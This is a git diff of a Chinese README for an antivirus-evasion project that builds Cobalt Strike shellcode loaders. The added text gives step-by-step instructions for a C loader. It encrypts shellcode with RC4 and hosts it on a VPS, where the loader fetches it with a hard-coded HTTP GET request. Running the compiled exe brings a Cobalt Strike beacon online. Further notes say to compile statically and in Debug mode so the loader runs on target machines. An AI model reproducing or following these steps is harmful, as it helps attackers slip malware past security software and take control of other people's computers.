@@ -19,6 +19,8 @@ python:
 - pyinstaller
 - requests
 
+C VS2019默认就够了
+
 ## 安装
 
 `git clone https://github.com/Gality369/CS-Avoid-killing.git`
@@ -35,6 +37,13 @@ python:
    > 4. 将在VPS上的payload路径填入PyLoader.py的url变量中,填入你刚刚设置的Key
    > 5. 用`python pyinstaller.py -F -w pyshellcode.py`打包文件,可执行文件在pyshellcode文件夹下的dist中,双击运行可以看到主机上线
 
+3. C版本:
+
+   > 1. 按要求填入你自己的Key,shellcdoe长度和shellcode,执行
+   > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生产的加密shellcode保存在payload.txt文件中并将其放在服务器上(如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
+   > 3. 在Loader中填入自己的Key和VPS的IP,编译
+   > 4. 执行编译出的exe,CS上线
+
 ## 注意
 
 1. pyinstaller安装细节
@@ -46,3 +55,7 @@ python:
    > 需要安装pywin32:https://github.com/mhammond/pywin32
 
 2. 目标是什么环境就在什么环境上打包,否则可能会出现无法上线的情况,不推荐使用py3对项目进行改造,ctypes对py3的支持不太好,会有些莫名其妙的bug
+
+3. 经过测试,C版本在X86Debug模式编译下无任何问题,Release模式下会存在莫名bug,在某些电脑上无法正常上线,请根据需求自行测试
+
+4. 编译选项不要选择动态编译,否则可能会因为目标靶机上缺少相应dll而无法运行.
